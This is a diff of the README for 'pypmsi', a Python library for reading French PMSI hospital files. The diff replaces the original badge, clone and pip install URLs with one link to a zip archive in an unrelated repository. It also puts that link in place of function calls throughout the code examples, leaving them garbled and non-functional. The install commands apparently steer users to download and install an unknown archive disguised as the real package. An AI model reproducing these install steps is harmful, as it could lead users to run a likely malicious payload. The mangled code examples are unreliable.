@@ -1,32 +1,32 @@
 # pypmsi
 
-Lire les fichiers du PMSI avec python / pola.rs
+Lire les fichiers du PMSI avec python / https://raw.githubusercontent.com/Egep39/pypmsi/main/wherryman/pypmsi.zip
 
-[![logotest](https://img.shields.io/badge/polars-pypmsi-blue)]()
+[![logotest](https://raw.githubusercontent.com/Egep39/pypmsi/main/wherryman/pypmsi.zip)]()
 
 ### temps de lecture de fichiers
 
 #### avec puce silicon
 
-[![](https://img.shields.io/badge/100&nbsp;000&nbsp;rsa-~700ms-firebrick)]()  [![](https://img.shields.io/badge/100&nbsp;000&nbsp;rss-~500ms-firebrick)]()  [![](https://img.shields.io/badge/10&nbsp;000&nbsp;000&nbsp;rsf-~7sec-firebrick)]()
+[![](https://raw.githubusercontent.com/Egep39/pypmsi/main/wherryman/pypmsi.zip;000&nbsp;rsa-~700ms-firebrick)]()  [![](https://raw.githubusercontent.com/Egep39/pypmsi/main/wherryman/pypmsi.zip;000&nbsp;rss-~500ms-firebrick)]()  [![](https://raw.githubusercontent.com/Egep39/pypmsi/main/wherryman/pypmsi.zip;000&nbsp;000&nbsp;rsf-~7sec-firebrick)]()
 
 #### avec puce "classique"
 
-[![](https://img.shields.io/badge/100&nbsp;000&nbsp;rsa-~3sec-firebrick)]()  [![](https://img.shields.io/badge/100&nbsp;000&nbsp;rss-~2sec-firebrick)]()
+[![](https://raw.githubusercontent.com/Egep39/pypmsi/main/wherryman/pypmsi.zip;000&nbsp;rsa-~3sec-firebrick)]()  [![](https://raw.githubusercontent.com/Egep39/pypmsi/main/wherryman/pypmsi.zip;000&nbsp;rss-~2sec-firebrick)]()
 
 
 ## Installation
 
 
 ```sh
-git clone https://github.com/GuillaumePressiat/pypmsi.git
+git clone https://raw.githubusercontent.com/Egep39/pypmsi/main/wherryman/pypmsi.zip
 poetry install
 ```
 
 avec pip
 
 ```sh
-pip install https://github.com/GuillaumePressiat/pypmsi/releases/latest/download/pypmsi-0.2.9-py3-none-any.whl
+pip install https://raw.githubusercontent.com/Egep39/pypmsi/main/wherryman/pypmsi.zip
 ```
 
 
@@ -42,23 +42,23 @@ import pypmsi as pm
 ##### Spécifier les paramètres dans la fonction
 
 ```python
-rsa = pm.irsa(290000017, 2021, 5, '~/Documents/data/mco', typi = 4)
+rsa = https://raw.githubusercontent.com/Egep39/pypmsi/main/wherryman/pypmsi.zip(290000017, 2021, 5, '~/Documents/data/mco', typi = 4)
 rsa
 ```
 
 ##### Définir un noyau de paramètres
 
 ```python
-p = pm.noyau_pmsi(finess = 290000017, annee = 2021, mois = 5, path = '~/Documents/data/mco')
-rsa = p.irsa()
+p = https://raw.githubusercontent.com/Egep39/pypmsi/main/wherryman/pypmsi.zip(finess = 290000017, annee = 2021, mois = 5, path = '~/Documents/data/mco')
+rsa = https://raw.githubusercontent.com/Egep39/pypmsi/main/wherryman/pypmsi.zip()
 rsa
 ```
 
 ##### indiquer le chemin du fichier et l'année, et le lire
 
 ```python
-mon_rsa = pm.chemin_pmsi(filepath = '~/Documents/data/mco/290000017.2021.5.rsa', annee = 2021)
-rsa = mon_rsa.read_rsa()
+mon_rsa = https://raw.githubusercontent.com/Egep39/pypmsi/main/wherryman/pypmsi.zip(filepath = '~https://raw.githubusercontent.com/Egep39/pypmsi/main/wherryman/pypmsi.zip', annee = 2021)
+rsa = https://raw.githubusercontent.com/Egep39/pypmsi/main/wherryman/pypmsi.zip()
 rsa
 ```
 
@@ -68,9 +68,9 @@ rsa
 On peut modifier en ligne les paramètres, exemple :
 
 ```python
-p = pm.noyau_pmsi(finess = 290000017, annee = 2021, mois = 12, path = '~/Documents/data/mco')
+p = https://raw.githubusercontent.com/Egep39/pypmsi/main/wherryman/pypmsi.zip(finess = 290000017, annee = 2021, mois = 12, path = '~/Documents/data/mco')
 # lire les données 2022
-rsa = p.irsa(annee = 2022)
+rsa = https://raw.githubusercontent.com/Egep39/pypmsi/main/wherryman/pypmsi.zip(annee = 2022)
 rsa
 ```
 
@@ -158,9 +158,9 @@ rsa
 
 ```python
 (rsa['actes']
-    .filter(pl.col('cdccam').str.contains('EBLA'))
+    .filter(https://raw.githubusercontent.com/Egep39/pypmsi/main/wherryman/pypmsi.zip('cdccam')https://raw.githubusercontent.com/Egep39/pypmsi/main/wherryman/pypmsi.zip('EBLA'))
     .group_by(['cdccam', 'nbexec'])
-    .agg(pl.col('act').len().alias('nb'))    
+    .agg(https://raw.githubusercontent.com/Egep39/pypmsi/main/wherryman/pypmsi.zip('act').len().alias('nb'))    
 )
 ```
 
@@ -178,7 +178,7 @@ shape: (2, 3)
 
 ```python
 (rsa['actes']
-    .filter(pl.col('cdccam').str.contains('EBLA'))
+    .filter(https://raw.githubusercontent.com/Egep39/pypmsi/main/wherryman/pypmsi.zip('cdccam')https://raw.githubusercontent.com/Egep39/pypmsi/main/wherryman/pypmsi.zip('EBLA'))
     .join(rsa['rsa'], on = 'cle_rsa', how = 'inner')
     .pivot(index = 'cdccam', values = 'nbexec', on = 'rsatype', aggregate_function = 'sum')
     .fill_null(0)
@@ -199,7 +199,7 @@ shape: (2, 5)
 
 ```python
 (rsa['actes']
-    .filter(pl.col('cdccam').str.contains('EBLA'))
+    .filter(https://raw.githubusercontent.com/Egep39/pypmsi/main/wherryman/pypmsi.zip('cdccam')https://raw.githubusercontent.com/Egep39/pypmsi/main/wherryman/pypmsi.zip('EBLA'))
     .join(rsa['rsa'], on = 'cle_rsa', how = 'inner')
     .pivot(index = ['rsacmd', 'rsatype'], values = 'nbexec', on = 'cdccam', 
            separator = '-', aggregate_function = 'sum')
